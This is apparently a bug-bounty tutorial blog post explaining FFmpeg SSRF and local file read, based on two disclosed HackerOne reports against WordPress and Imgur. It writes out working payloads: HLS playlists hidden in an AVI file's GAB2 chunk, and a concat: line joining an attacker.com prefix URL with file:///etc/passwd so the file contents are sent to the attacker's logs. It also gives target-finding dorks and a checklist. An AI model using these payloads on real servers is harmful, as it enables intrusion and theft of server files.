---
layout: post
title: "FFmpeg SSRF: How a Video Converter Became a Spy for Hackers"
date: 2026-05-29 08:00 +0530
categories: [Real-Life-Findings]
tags: [Real-Life-Findings]
---

# FFmpeg SSRF: How a Video Converter Became a Spy for Hackers

You know SSRF. You know how to get a pingback. Cool. But what if I told you that a video file — a freaking *video file* — can make a server read its own `/etc/passwd` and send it straight to your logs? Let's go.

> **Based on real disclosed HackerOne reports — both patched and publicly available:**
> - [HackerOne #237381 — WordPress FFmpeg SSRF + local file read](https://hackerone.com/reports/237381) *(Disclosed July 2017)*
> - [HackerOne #115857 — Imgur FFmpeg SSRF + local file read](https://hackerone.com/reports/115857) *(Disclosed April 2016)*

---

## Table of Contents

1. [What even is FFmpeg and why should you care](#1-what-even-is-ffmpeg-and-why-should-you-care)
2. [HLS playlists — the Trojan horse format](#2-hls-playlists--the-trojan-horse-format)
3. [Why an AVI file and not anything else](#3-why-an-avi-file-and-not-anything-else)
4. [The SSRF pingback part (you already know this)](#4-the-ssrf-pingback-part-you-already-know-this)
5. [The magic trick — how file contents travel to your server](#5-the-magic-trick--how-file-contents-travel-to-your-server)
6. [The exact payloads, line by line](#6-the-exact-payloads-line-by-line)
7. [How to detect FFmpeg on a target](#7-how-to-detect-ffmpeg-on-a-target)
8. [Where to look for this in the wild](#8-where-to-look-for-this-in-the-wild)
9. [Your hunting checklist](#9-your-hunting-checklist)

---

## 1. What even is FFmpeg and why should you care

FFmpeg is an open-source tool that converts videos. MP4 to GIF, AVI to MP4, whatever. Every single website that has video upload, video trimming, thumbnail generation, or a "convert video to GIF" feature is almost certainly running FFmpeg somewhere in the backend.

Here's what makes it dangerous from a hacker's perspective: FFmpeg doesn't just decode pixels. It supports a ridiculous number of protocols to fetch content from. Like, protocols nobody asked for:

```
http://     → fetch from internet ✓ (fine)
file://     → read LOCAL files from the server 💀
gopher://   → interact with internal services 💀
ftp://      → access FTP servers 💀
concat:     → join multiple sources into one string 💀
subfile:    → read slices of files 💀
```

That `file://` thing? That's literally FFmpeg saying "yeah sure I'll read files directly from the server's disk." And `concat:` is the sneaky one that lets us smuggle file contents out — but we'll get to that.

> **The core problem:** FFmpeg was designed to be insanely flexible. That flexibility is exactly what attackers exploit. It's not a bug in FFmpeg per se — it's that developers deploy it without restricting which protocols it's allowed to use.

---

## 2. HLS playlists — the Trojan horse format

Before we get to the exploit, you need to understand HLS. HLS stands for HTTP Live Streaming. Apple invented it so your phone could stream video without downloading a 4GB file upfront.

Instead of one big video, HLS breaks it into small chunks and uses a *playlist file* to list all those chunks in order. Think of it like a table of contents for a video:

```
# Normal HLS playlist (.m3u8 file)

#EXTM3U                            ← "I am a playlist file"
#EXT-X-MEDIA-SEQUENCE:0           ← "Start from chunk 0"
#EXTINF:10.0,                     ← "Next chunk is 10 seconds"
http://cdn.netflix.com/chunk1.ts  ← go fetch this
#EXTINF:10.0,
http://cdn.netflix.com/chunk2.ts  ← then fetch this
#EXT-X-ENDLIST                    ← "we're done"
```

When FFmpeg sees a playlist, it dutifully fetches every URL listed inside it. *Every single one.* From the server. That's just how it works.

> **"FFmpeg sees a URL in a playlist → FFmpeg fetches that URL. No questions asked. No validation. It just goes."**

So if an attacker can get FFmpeg to read *their* playlist instead of a real one — they can make FFmpeg fetch any URL they want. Including internal ones. Including `169.254.169.254`. Including `file:///etc/passwd`.

But wait — how do you *get* FFmpeg to read your malicious playlist? You can't just upload a `.m3u8` file to WordPress. That's where the AVI trick comes in.

---

## 3. Why an AVI file and not anything else

This is the question everyone asks. Why AVI? Why not just upload the playlist directly?

Simple: **the website only accepts video files.** You try uploading a `.m3u8` playlist to WordPress video uploader and it'll laugh at you. So attackers need to *hide* the playlist inside a valid video file container.

AVI is perfect for this because of how it's structured. An AVI file isn't just raw video — it's a container with multiple "chunks" inside, each serving a different purpose:

```
AVI File Internal Structure:
┌────────────────────────────────────────────────────────┐
│ RIFF Header   → tells the OS "I am an AVI file" ✓     │
├────────────────────────────────────────────────────────┤
│ strh chunk    → stream header, video metadata          │
├────────────────────────────────────────────────────────┤
│ movi chunk    → actual video frame data                │
├────────────────────────────────────────────────────────┤
│ GAB2 chunk    → originally for subtitles               │
│   ← ATTACKER PUTS HLS PLAYLIST HERE                   │
│                                                        │
│   #EXTM3U                                              │
│   #EXT-X-MEDIA-SEQUENCE:0                             │
│   #EXTINF:1.0                                          │
│   http://attacker.com/ssrf   ← SSRF payload           │
│   #EXT-X-ENDLIST                                       │
└────────────────────────────────────────────────────────┘
```

GAB2 is a chunk type meant for extended subtitle data. But here's the beautiful mess: FFmpeg, in its infinite wisdom to "support everything," will read an HLS playlist out of a GAB2 chunk and process it as if it were a real playlist. A real playlist with real URLs. URLs that FFmpeg then fetches. From the server.

> **Analogy:** The AVI file is a sealed envelope. The GAB2 chunk is a hidden note inside that envelope. The note says "also go pick up a package from THIS address." FFmpeg is the delivery guy who blindly follows ALL instructions, including the hidden note, without telling anyone.

So the attack is: craft an AVI file where the GAB2 chunk contains a malicious HLS playlist. Upload it. Watch FFmpeg process it and follow your instructions.

The researcher in the WordPress report even attached the exploit AVI directly to the bug report. He literally wrote: *"Do not try to play it!"* — because it wasn't a real video. It was just an AVI container with a playlist bomb inside.

---

## 4. The SSRF pingback part (you already know this)

The SSRF itself is straightforward once you have the above setup.

The simplest malicious playlist inside the AVI:

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
http://YOUR-SERVER.com/ssrf-test   ← FFmpeg fetches THIS from the server
#EXT-X-ENDLIST
```

Upload the AVI to WordPress or wherever → click "Edit" or trigger processing → check your server logs:

```
# Your server receives:
192.0.87.12 - - [06/Jun/2017] "GET /ssrf-test HTTP/1.1" 200 -
# ↑ This IP belongs to Automattic (WordPress's parent company)

User-Agent: Lavf/56.25.101
# ↑ Lavf = FFmpeg's libavformat. You've got SSRF confirmed.
```

That `Lavf` User-Agent is the fingerprint. When you see that hitting your Burp Collaborator or interactsh server, you know FFmpeg is running on the backend and you have SSRF.

But here's where most people stop. They get the pingback, mark it as "SSRF — Blind" and move on. The real wizards keep going and turn that into file disclosure. That's where the money is.

---

## 5. The magic trick — how file contents travel to your server

Right. This is the part that confuses everyone at first and it should — it's genuinely clever.

The question is: if FFmpeg is making requests *from* the server, how do file contents from that server get *to* you? You're not inside the server. You can't just say `file:///etc/passwd` and have it emailed to you.

The answer is FFmpeg's `concat:` protocol. Here's what concat does:

```
# concat: joins multiple sources into ONE combined string
concat:SOURCE_A|SOURCE_B

# Example:
concat:http://attacker.com/prefix.txt|file:///etc/passwd

# What happens step by step:
# 1. FFmpeg fetches SOURCE_A → gets: "http://attacker.com?"
# 2. FFmpeg reads SOURCE_B  → gets: "root:x:0:0:root:/root:/bin/bash\n..."
# 3. concat joins them:      → "http://attacker.com?root:x:0:0:root:/root:/bin/bash"
# 4. FFmpeg treats this combined string as a URL in the playlist
# 5. FFmpeg makes HTTP GET to that URL
# 6. YOUR server receives: GET /?root:x:0:0:root:/root:/bin/bash
# 7. /etc/passwd first line is sitting right there in your access logs!
```

> **The file never flies directly to you. It gets glued onto YOUR URL by FFmpeg's `concat:` — then shows up in your own server logs as part of the request path.**

The `?` at the end of the prefix URL is the entire trick. It turns the file contents into a URL query string. FFmpeg doesn't know it's being used as a data exfiltration vehicle. It's just doing what it was told — concatenate these sources, then fetch the resulting URL.

---

## 6. The exact payloads, line by line

### Imgur version (simpler — URL input, no AVI needed)

Imgur's `/vidgif` endpoint accepted a direct URL to a video file. The attacker just hosted a fake MP4 that was actually an HLS playlist:

```
# POST request to Imgur
POST /vidgif/upload HTTP/1.1
Host: imgur.com

source=http://attacker.com/1.mp4&url=http://attacker.com/1.mp4&start=0&stop=5
```

```
# attacker.com/1.mp4 — actually an HLS playlist in disguise:

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```

```
# attacker.com/header.m3u8 — the prefix that creates the URL:

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://attacker.com?
# ↑ note the ? at the end — this is CRITICAL
```

```
# What attacker's server logs showed:
GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1 400
    ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
    /etc/passwd first line. Right there. In the URL.
```

### WordPress version (AVI + dynamic server)

WordPress didn't accept URLs directly — you had to upload a video file. So the researcher built a crafted AVI with the playlist inside the GAB2 chunk, and ran a Python server to serve dynamic playlist responses:

```
# Inside the AVI's GAB2 chunk (the hidden HLS playlist):

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
http://attacker-server:8080/initial.m3u?filename=/etc/passwd
#EXT-X-ENDLIST
```

```
# attacker's server dynamically responds to FFmpeg's request with:

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
/some/dummy/text.txt    ← segment 1: sets file type as "text" for FFmpeg
#EXTINF:1.0
file:///etc/passwd      ← segment 2: read this from server disk
#EXT-X-ENDLIST
```

FFmpeg concatenates both segments and renders `/etc/passwd` content as a "text video" — like a terminal showing the file. The researcher extracted the contents from the resulting converted video.

> **What they actually confirmed reading:**
> - From WordPress server: `/etc/hostname` → `tc1.videos.dca.wordpress.com`
> - From WordPress server: `/etc/issue` → `Debian GNU/Linux 8`
> - From Imgur server: first line of `/etc/passwd` → visible directly in HTTP request URL

---

## 7. How to detect FFmpeg on a target

Before you try anything on a bug bounty target, confirm FFmpeg is actually running.

### Method 1: exiftool on a processed output

```bash
# Download a converted GIF or video from the target
exiftool output.gif

# Look for these fields:
# Software   : Lavf/56.25.101   ← FFmpeg's libavformat
# Encoder    : Lavc/56.26.100   ← FFmpeg's libavcodec
# Comment    : ffmpeg
```

### Method 2: Callback User-Agent

```
# If you get an SSRF pingback to your Burp Collaborator, check the User-Agent:
User-Agent: Lavf/55.48.100
#           ↑ This is FFmpeg. SSRF confirmed.
```

### Method 3: Error messages

Upload a garbage file and look at any error message returned. If you see `ffmpeg`, `avcodec`, or `Lavf` anywhere in errors — confirmed.

---

## 8. Where to look for this in the wild

Any feature that processes video with FFmpeg is fair game. Priority targets:

| Priority | Feature | Why |
|----------|----------|-----|
| 🔴 High | Video to GIF converters | Exact attack surface from the Imgur report |
| 🔴 High | Video upload + transcoding | If they convert your video, FFmpeg is there |
| 🔴 High | "Import video from URL" | Often passes URL directly to FFmpeg — no AVI needed |
| 🟡 Medium | Thumbnail generation from video | FFmpeg generates preview frames |
| 🟡 Medium | Podcast / audio processing | FFmpeg handles audio too, same attack surface |
| 🟡 Medium | In-browser video trimming / editing | Anything that cuts/merges video server-side |

### Google Dorks for finding these features on a target

```
site:target.com inurl:vidgif OR inurl:convert OR inurl:video
site:target.com inurl:upload inurl:video
site:target.com "video to gif" OR "convert video" OR "upload video"
site:target.com inurl:import OR inurl:fetch OR inurl:source=http
```

---

## 9. Your hunting checklist

When you find a video processing feature on a bug bounty target, work through this exactly:

- [ ] Find a feature that processes video — upload, convert, trim, thumbnail, GIF generation
- [ ] Use `exiftool` on any output file. Look for `Lavf` or `ffmpeg` in metadata to confirm FFmpeg
- [ ] If it accepts a URL directly — point it at your Burp Collaborator first. Check for `Lavf` User-Agent in the callback
- [ ] If it only accepts file uploads — craft a malicious AVI with HLS playlist in the GAB2 chunk pointing to your Collaborator
- [ ] Got a callback? SSRF confirmed. Report it. That alone is valid. Don't push further unless the program's scope allows it.
- [ ] To escalate to file read — use `concat:` protocol with `file:///etc/passwd` and a prefix URL ending in `?`. File contents will appear in your server's request logs as part of the URL.
- [ ] Always report responsibly. Stop at the point of proof. Don't dump the entire server.

---

## The one thing to remember

FFmpeg is a processing engine that trusts everything it reads. If you can get it to read your playlist — whether through a URL parameter or a crafted AVI file — it will follow every URL inside it, making requests from the server. The `concat:` + `file://` combo is what turns a boring pingback into a critical local file read. The `?` at the end of your prefix URL is the bridge that carries file contents to your logs.

Both vulnerabilities referenced in this blog are fully patched and publicly disclosed. This is for educational purposes — go find your own FFmpeg targets, responsibly.

---

## References

- [HackerOne #237381 — SSRF and local file disclosure via FFmpeg HLS processing (WordPress)](https://hackerone.com/reports/237381)
- [HackerOne #115857 — SSRF and local file read in video to GIF converter (Imgur)](https://hackerone.com/reports/115857)
- [FFmpeg Protocols Documentation](https://www.ffmpeg.org/ffmpeg-protocols.html)
- [FFmpeg concat protocol](https://www.ffmpeg.org/ffmpeg-protocols.html#concat)
- [Video POC of Advance SSRF](https://youtu.be/v3YQqTb5geU?si=E9ACJclIRs828idn)


